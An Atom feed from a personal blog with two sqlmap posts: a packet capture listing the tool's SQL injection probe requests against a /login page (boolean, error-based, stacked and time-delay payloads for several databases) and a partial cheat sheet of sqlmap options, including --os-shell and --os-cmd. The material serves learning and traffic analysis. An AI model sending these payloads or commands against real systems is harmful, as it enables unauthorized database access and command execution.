<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: tools~sqlmap | kk Blog —— 通用基础]]></title>
  <link href="http://abcdxyzk.github.io/blog/cats/tools~sqlmap/atom.xml" rel="self"/>
  <link href="http://abcdxyzk.github.io/"/>
  <updated>2025-07-21T17:22:06+08:00</updated>
  <id>http://abcdxyzk.github.io/</id>
  <author>
    <name><![CDATA[kk]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[sqlmap抓包]]></title>
    <link href="http://abcdxyzk.github.io/blog/2022/10/30/sqlmap-sample/"/>
    <updated>2022-10-30T11:05:00+08:00</updated>
    <id>http://abcdxyzk.github.io/blog/2022/10/30/sqlmap-sample</id>
    <content type="html"><![CDATA[<p>用tcpdump抓包，wireshark导出text，urldecode解码，得到sqlmap的注入语句</p>

<pre><code>    GET /login?username=abc&amp;password=123 HTTP/1.1 
    GET /login?username=abc&amp;password=123 HTTP/1.1 
    GET /login?username=2795&amp;password=123 HTTP/1.1 
    GET /login?username=abc((),",),.'&amp;password=123 HTTP/1.1 
    GET /login?username=abc'VOhiEk&lt;'"&gt;ULNwju&amp;password=123 HTTP/1.1 
    GET /login?username=abc') AND 2781=9607 AND ('Rnuk'='Rnuk&amp;password=123 HTTP/1.1 
    GET /login?username=abc' AND 2247=4788 AND 'ddJs'='ddJs&amp;password=123 HTTP/1.1 
    GET /login?username=abc) AND 6875=6686 AND (3318=3318&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 3033=6740&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 9516=5869-- dooX&amp;password=123 HTTP/1.1 
    GET /login?username=(SELECT (CASE WHEN (2922=6853) THEN 'abc' ELSE (SELECT 6853 UNION SELECT 6863) END))&amp;password=123 HTTP/1.1 
    GET /login?username=abc') AND EXTRACTVALUE(9018,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(9018=9018,1))),0x717a6b6a71)) AND ('WLxo'='WLxo&amp;password=123 HTTP/1.1 
    GET /login?username=abc' AND EXTRACTVALUE(9018,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(9018=9018,1))),0x717a6b6a71)) AND 'EnIq'='EnIq&amp;password=123 HTTP/1.1 
    GET /login?username=abc) AND EXTRACTVALUE(9018,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(9018=9018,1))),0x717a6b6a71)) AND (1539=1539&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND EXTRACTVALUE(9018,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(9018=9018,1))),0x717a6b6a71))&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND EXTRACTVALUE(9018,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(9018=9018,1))),0x717a6b6a71))-- Zpqd&amp;password=123 HTTP/1.1 
    GET /login?username=abc') AND 3119=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3119=3119) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC) AND ('yoJQ'='yoJQ&amp;password=123 HTTP/1.1 
    GET /login?username=abc' AND 3119=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3119=3119) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC) AND 'rRrm'='rRrm&amp;password=123 HTTP/1.1 
    GET /login?username=abc) AND 3119=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3119=3119) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC) AND (9921=9921&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 3119=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3119=3119) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC)&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 3119=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3119=3119) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC)-- MRHt&amp;password=123 HTTP/1.1 
    GET /login?username=abc') AND 6208 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (6208=6208) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113))) AND ('uWsT'='uWsT&amp;password=123 HTTP/1.1 
    GET /login?username=abc' AND 6208 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (6208=6208) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113))) AND 'autW'='autW&amp;password=123 HTTP/1.1 
    GET /login?username=abc) AND 6208 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (6208=6208) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113))) AND (6576=6576&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 6208 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (6208=6208) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113)))&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 6208 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (6208=6208) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113)))-- bXtg&amp;password=123 HTTP/1.1 
    GET /login?username=abc') AND 6846=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6846=6846) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('VlYe'='VlYe&amp;password=123 HTTP/1.1 
    GET /login?username=abc' AND 6846=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6846=6846) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'XgIT'='XgIT&amp;password=123 HTTP/1.1 
    GET /login?username=abc) AND 6846=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6846=6846) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (6471=6471&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 6846=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6846=6846) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 6846=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6846=6846) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- IRUY&amp;password=123 HTTP/1.1 
    GET /login?username=(SELECT CONCAT(CONCAT('qvjkq',(CASE WHEN (6090=6090) THEN '1' ELSE '0' END)),'qzkjq'))&amp;password=123 HTTP/1.1 
    GET /login?username=abc');SELECT PG_SLEEP(5)--&amp;password=123 HTTP/1.1 
    GET /login?username=abc';SELECT PG_SLEEP(5)--&amp;password=123 HTTP/1.1 
    GET /login?username=abc);SELECT PG_SLEEP(5)--&amp;password=123 HTTP/1.1 
    GET /login?username=abc;SELECT PG_SLEEP(5)--&amp;password=123 HTTP/1.1 
    GET /login?username=abc');WAITFOR DELAY '0:0:5'--&amp;password=123 HTTP/1.1 
    GET /login?username=abc';WAITFOR DELAY '0:0:5'--&amp;password=123 HTTP/1.1 
    GET /login?username=abc);WAITFOR DELAY '0:0:5'--&amp;password=123 HTTP/1.1 
    GET /login?username=abc;WAITFOR DELAY '0:0:5'--&amp;password=123 HTTP/1.1 
    GET /login?username=abc');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(83)||CHR(118)||CHR(118),5) FROM DUAL--&amp;password=123 HTTP/1.1 
    GET /login?username=abc';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(83)||CHR(118)||CHR(118),5) FROM DUAL--&amp;password=123 HTTP/1.1 
    GET /login?username=abc);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(83)||CHR(118)||CHR(118),5) FROM DUAL--&amp;password=123 HTTP/1.1 
    GET /login?username=abc;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(83)||CHR(118)||CHR(118),5) FROM DUAL--&amp;password=123 HTTP/1.1 
    GET /login?username=abc') AND (SELECT 5242 FROM (SELECT(SLEEP(5)))uNyg) AND ('BoHR'='BoHR&amp;password=123 HTTP/1.1 
    GET /login?username=abc' AND (SELECT 5242 FROM (SELECT(SLEEP(5)))uNyg) AND 'IFHW'='IFHW&amp;password=123 HTTP/1.1 
    GET /login?username=abc) AND (SELECT 5242 FROM (SELECT(SLEEP(5)))uNyg) AND (2757=2757&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND (SELECT 5242 FROM (SELECT(SLEEP(5)))uNyg)&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND (SELECT 5242 FROM (SELECT(SLEEP(5)))uNyg)-- zwZm&amp;password=123 HTTP/1.1 
    GET /login?username=abc') AND 8170=(SELECT 8170 FROM PG_SLEEP(5)) AND ('CuGS'='CuGS&amp;password=123 HTTP/1.1 
    GET /login?username=abc' AND 8170=(SELECT 8170 FROM PG_SLEEP(5)) AND 'WmPH'='WmPH&amp;password=123 HTTP/1.1 
    GET /login?username=abc) AND 8170=(SELECT 8170 FROM PG_SLEEP(5)) AND (6554=6554&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 8170=(SELECT 8170 FROM PG_SLEEP(5))&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 8170=(SELECT 8170 FROM PG_SLEEP(5))-- OgwJ&amp;password=123 HTTP/1.1 
    GET /login?username=abc') WAITFOR DELAY '0:0:5' AND ('jCFc'='jCFc&amp;password=123 HTTP/1.1 
    GET /login?username=abc' WAITFOR DELAY '0:0:5' AND 'FpFX'='FpFX&amp;password=123 HTTP/1.1 
    GET /login?username=abc) WAITFOR DELAY '0:0:5' AND (7644=7644&amp;password=123 HTTP/1.1 
    GET /login?username=abc WAITFOR DELAY '0:0:5'&amp;password=123 HTTP/1.1 
    GET /login?username=abc WAITFOR DELAY '0:0:5'-- sPYO&amp;password=123 HTTP/1.1 
    GET /login?username=abc') AND 4938=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(86)||CHR(112)||CHR(86),5) AND ('BmJW'='BmJW&amp;password=123 HTTP/1.1 
    GET /login?username=abc' AND 4938=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(86)||CHR(112)||CHR(86),5) AND 'svZV'='svZV&amp;password=123 HTTP/1.1 
    GET /login?username=abc) AND 4938=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(86)||CHR(112)||CHR(86),5) AND (8259=8259&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 4938=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(86)||CHR(112)||CHR(86),5)&amp;password=123 HTTP/1.1 
    GET /login?username=abc AND 4938=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(86)||CHR(112)||CHR(86),5)-- tkiR&amp;password=123 HTTP/1.1 
    GET /login?username=abc') ORDER BY 1-- xBKA&amp;password=123 HTTP/1.1 
    GET /login?username=abc') ORDER BY 2552-- QaqN&amp;password=123 HTTP/1.1 
    GET /login?username=abc' ORDER BY 1-- CXec&amp;password=123 HTTP/1.1 
    GET /login?username=abc' ORDER BY 5386-- OCdf&amp;password=123 HTTP/1.1 
    GET /login?username=abc) ORDER BY 1-- qihI&amp;password=123 HTTP/1.1 
    GET /login?username=abc) ORDER BY 8561-- muFp&amp;password=123 HTTP/1.1 
    GET /login?username=abc ORDER BY 1-- zHug&amp;password=123 HTTP/1.1 
    GET /login?username=abc ORDER BY 6155-- jbRk&amp;password=123 HTTP/1.1 
    GET /login?username=abc ORDER BY 1-- JNHc&amp;password=123 HTTP/1.1 
    GET /login?username=abc ORDER BY 7301-- lLsH&amp;password=123 HTTP/1.1 
    GET /login?username=abc&amp;password=1760 HTTP/1.1 
    GET /login?username=abc&amp;password=123).),"')((. HTTP/1.1 
    GET /login?username=abc&amp;password=123'JHsedc&lt;'"&gt;YLcugw HTTP/1.1 
    GET /login?username=abc&amp;password=123) AND 9079=5601 AND (1335=1335 HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 1857=7867 HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 8511=5177-- pZVc HTTP/1.1 
    GET /login?username=abc&amp;password=123') AND 7997=8676 AND ('HkRV'='HkRV HTTP/1.1 
    GET /login?username=abc&amp;password=123' AND 1648=3770 AND 'QrJb'='QrJb HTTP/1.1 
    GET /login?username=abc&amp;password=(SELECT (CASE WHEN (5600=9308) THEN 123 ELSE (SELECT 9308 UNION SELECT 4757) END)) HTTP/1.1 
    GET /login?username=abc&amp;password=123) AND EXTRACTVALUE(7970,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(7970=7970,1))),0x717a6b6a71)) AND (8074=8074 HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND EXTRACTVALUE(7970,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(7970=7970,1))),0x717a6b6a71)) HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND EXTRACTVALUE(7970,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(7970=7970,1))),0x717a6b6a71))-- mRSf HTTP/1.1 
    GET /login?username=abc&amp;password=123') AND EXTRACTVALUE(7970,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(7970=7970,1))),0x717a6b6a71)) AND ('hMli'='hMli HTTP/1.1 
    GET /login?username=abc&amp;password=123' AND EXTRACTVALUE(7970,CONCAT(0x5c,0x71766a6b71,(SELECT (ELT(7970=7970,1))),0x717a6b6a71)) AND 'PpkB'='PpkB HTTP/1.1 
    GET /login?username=abc&amp;password=123) AND 9196=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (9196=9196) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC) AND (7589=7589 HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 9196=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (9196=9196) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC) HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 9196=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (9196=9196) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC)-- AWtz HTTP/1.1 
    GET /login?username=abc&amp;password=123') AND 9196=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (9196=9196) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC) AND ('Kndh'='Kndh HTTP/1.1 
    GET /login?username=abc&amp;password=123' AND 9196=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (9196=9196) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)) AS NUMERIC) AND 'ynpj'='ynpj HTTP/1.1 
    GET /login?username=abc&amp;password=123) AND 8876 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (8876=8876) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113))) AND (4254=4254 HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 8876 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (8876=8876) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113))) HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 8876 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (8876=8876) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113)))-- Cppc HTTP/1.1 
    GET /login?username=abc&amp;password=123') AND 8876 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (8876=8876) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113))) AND ('jrda'='jrda HTTP/1.1 
    GET /login?username=abc&amp;password=123' AND 8876 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (8876=8876) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(106)+CHAR(113))) AND 'Hxec'='Hxec HTTP/1.1 
    GET /login?username=abc&amp;password=123) AND 8533=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (8533=8533) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (3323=3323 HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 8533=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (8533=8533) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 8533=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (8533=8533) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- ipPa HTTP/1.1 
    GET /login?username=abc&amp;password=123') AND 8533=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (8533=8533) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('LKje'='LKje HTTP/1.1 
    GET /login?username=abc&amp;password=123' AND 8533=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (8533=8533) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'qtMI'='qtMI HTTP/1.1 
    GET /login?username=abc&amp;password=(SELECT CONCAT(CONCAT('qvjkq',(CASE WHEN (8658=8658) THEN '1' ELSE '0' END)),'qzkjq')) HTTP/1.1 
    GET /login?username=abc&amp;password=123);SELECT PG_SLEEP(5)-- HTTP/1.1 
    GET /login?username=abc&amp;password=123;SELECT PG_SLEEP(5)-- HTTP/1.1 
    GET /login?username=abc&amp;password=123');SELECT PG_SLEEP(5)-- HTTP/1.1 
    GET /login?username=abc&amp;password=123';SELECT PG_SLEEP(5)-- HTTP/1.1 
    GET /login?username=abc&amp;password=123);WAITFOR DELAY '0:0:5'-- HTTP/1.1 
    GET /login?username=abc&amp;password=123;WAITFOR DELAY '0:0:5'-- HTTP/1.1 
    GET /login?username=abc&amp;password=123');WAITFOR DELAY '0:0:5'-- HTTP/1.1 
    GET /login?username=abc&amp;password=123';WAITFOR DELAY '0:0:5'-- HTTP/1.1 
    GET /login?username=abc&amp;password=123);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(78)||CHR(107)||CHR(76),5) FROM DUAL-- HTTP/1.1 
    GET /login?username=abc&amp;password=123;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(78)||CHR(107)||CHR(76),5) FROM DUAL-- HTTP/1.1 
    GET /login?username=abc&amp;password=123');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(78)||CHR(107)||CHR(76),5) FROM DUAL-- HTTP/1.1 
    GET /login?username=abc&amp;password=123';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(78)||CHR(107)||CHR(76),5) FROM DUAL-- HTTP/1.1 
    GET /login?username=abc&amp;password=123) AND (SELECT 9433 FROM (SELECT(SLEEP(5)))UOBG) AND (5534=5534 HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND (SELECT 9433 FROM (SELECT(SLEEP(5)))UOBG) HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND (SELECT 9433 FROM (SELECT(SLEEP(5)))UOBG)-- wyKY HTTP/1.1 
    GET /login?username=abc&amp;password=123') AND (SELECT 9433 FROM (SELECT(SLEEP(5)))UOBG) AND ('doQl'='doQl HTTP/1.1 
    GET /login?username=abc&amp;password=123' AND (SELECT 9433 FROM (SELECT(SLEEP(5)))UOBG) AND 'IMvM'='IMvM HTTP/1.1 
    GET /login?username=abc&amp;password=123) AND 1515=(SELECT 1515 FROM PG_SLEEP(5)) AND (8248=8248 HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 1515=(SELECT 1515 FROM PG_SLEEP(5)) HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 1515=(SELECT 1515 FROM PG_SLEEP(5))-- PgeE HTTP/1.1 
    GET /login?username=abc&amp;password=123') AND 1515=(SELECT 1515 FROM PG_SLEEP(5)) AND ('OoDW'='OoDW HTTP/1.1 
    GET /login?username=abc&amp;password=123' AND 1515=(SELECT 1515 FROM PG_SLEEP(5)) AND 'Zqlk'='Zqlk HTTP/1.1 
    GET /login?username=abc&amp;password=123) WAITFOR DELAY '0:0:5' AND (6147=6147 HTTP/1.1 
    GET /login?username=abc&amp;password=123 WAITFOR DELAY '0:0:5' HTTP/1.1 
    GET /login?username=abc&amp;password=123 WAITFOR DELAY '0:0:5'-- hVmx HTTP/1.1 
    GET /login?username=abc&amp;password=123') WAITFOR DELAY '0:0:5' AND ('oDNw'='oDNw HTTP/1.1 
    GET /login?username=abc&amp;password=123' WAITFOR DELAY '0:0:5' AND 'tWTl'='tWTl HTTP/1.1 
    GET /login?username=abc&amp;password=123) AND 4878=DBMS_PIPE.RECEIVE_MESSAGE(CHR(111)||CHR(70)||CHR(77)||CHR(108),5) AND (5787=5787 HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 4878=DBMS_PIPE.RECEIVE_MESSAGE(CHR(111)||CHR(70)||CHR(77)||CHR(108),5) HTTP/1.1 
    GET /login?username=abc&amp;password=123 AND 4878=DBMS_PIPE.RECEIVE_MESSAGE(CHR(111)||CHR(70)||CHR(77)||CHR(108),5)-- Djiq HTTP/1.1 
    GET /login?username=abc&amp;password=123') AND 4878=DBMS_PIPE.RECEIVE_MESSAGE(CHR(111)||CHR(70)||CHR(77)||CHR(108),5) AND ('Lyac'='Lyac HTTP/1.1 
    GET /login?username=abc&amp;password=123' AND 4878=DBMS_PIPE.RECEIVE_MESSAGE(CHR(111)||CHR(70)||CHR(77)||CHR(108),5) AND 'APIe'='APIe HTTP/1.1 
    GET /login?username=abc&amp;password=123) ORDER BY 1-- TMmJ HTTP/1.1 
    GET /login?username=abc&amp;password=123) ORDER BY 9030-- RTTw HTTP/1.1 
    GET /login?username=abc&amp;password=123 ORDER BY 1-- mDvA HTTP/1.1 
    GET /login?username=abc&amp;password=123 ORDER BY 1200-- eNbW HTTP/1.1 
    GET /login?username=abc&amp;password=123 ORDER BY 1-- sYTq HTTP/1.1 
    GET /login?username=abc&amp;password=123 ORDER BY 8916-- lILp HTTP/1.1 
    GET /login?username=abc&amp;password=123') ORDER BY 1-- AOfY HTTP/1.1 
    GET /login?username=abc&amp;password=123') ORDER BY 6451-- Hzva HTTP/1.1 
    GET /login?username=abc&amp;password=123' ORDER BY 1-- Pauy HTTP/1.1 
    GET /login?username=abc&amp;password=123' ORDER BY 9918-- mEOJ HTTP/1.1 
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sqlmap常用语句]]></title>
    <link href="http://abcdxyzk.github.io/blog/2022/10/30/sqlmap-cmd/"/>
    <updated>2022-10-30T11:04:00+08:00</updated>
    <id>http://abcdxyzk.github.io/blog/2022/10/30/sqlmap-cmd</id>
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_36742250/article/details/116233702">https://blog.csdn.net/qq_36742250/article/details/116233702</a></p>

<h4>shell</h4>

<pre><code>    --sql-shell
    --os-shell
    --os-cmd=ipconfig
</code></pre>

<h2>sqlmap常用指令汇总</h2>

<h4>1、目标</h4>

<p>至少提供一个以下选项以指定目标</p>

<pre><code>    -d DIRECT           直接连接数据库
    -u URL, --url=URL   目标 URL（例如："http://www.site.com/vuln.php?id=1"）
    -l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址
    -m BULKFILE         从文本文件中获取批量目标
    -r REQUESTFILE      从文件中读取 HTTP 请求
    -g GOOGLEDORK       使用 Google dork 结果作为目标
    -c CONFIGFILE       从 INI 配置文件中加载选项
</code></pre>

<h4>2、请求</h4>

<p>以下选项可以指定连接目标地址的方式</p>

<pre><code>    --method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）
    --data=DATA         使用 POST 发送数据串（例如："id=1"）
    --param-del=PARA..  设置参数值分隔符（例如：;）
    --cookie=COOKIE     指定 HTTP Cookie（例如："PHPSESSID=a8d127e.."）
    --cookie-del=COO..  设置 cookie 分隔符（例如：;）
    --load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件
    --drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数
    --user-agent=AGENT  指定 HTTP User-Agent
    --random-agent      使用随机的 HTTP User-Agent
    --host=HOST         指定 HTTP Host
    --referer=REFERER   指定 HTTP Referer
    -H HEADER, --hea..  设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）
    --headers=HEADERS   设置额外的 HTTP 头参数（例如："Accept-Language: fr\nETag: 123"）
    --auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）
    --auth-cred=AUTH..  HTTP 认证凭证（username:password）
    --auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件
    --ignore-code=IG..  忽略（有问题的）HTTP 错误码（例如：401）
    --ignore-proxy      忽略系统默认代理设置
    --ignore-redirects  忽略重定向尝试
    --ignore-timeouts   忽略连接超时
    --proxy=PROXY       使用代理连接目标 URL
    --proxy-cred=PRO..  使用代理进行认证（username:password）
    --proxy-file=PRO..  从文件中加载代理列表
    --tor               使用 Tor 匿名网络
    --tor-port=TORPORT  设置 Tor 代理端口代替默认端口
    --tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））
    --check-tor         检查是否正确使用了 Tor
    --delay=DELAY       设置每个 HTTP 请求的延迟秒数
    --timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）
    --retries=RETRIES   连接超时时重试次数（默认为 3）
    --randomize=RPARAM  随机更改给定的参数值
    --safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：
                        有些网站在你连续多次访问错误地址时会关闭会话连接，
                        后面的“请求”小节有详细说明）
    --safe-post=SAFE..  使用 POST 方法发送合法的数据
    --safe-req=SAFER..  从文件中加载合法的 HTTP 请求
    --safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求
    --skip-urlencode    不对 payload 数据进行 URL 编码
    --csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token
    --csrf-url=CSRFURL  指定可提取防 CSRF 攻击 token 的 URL
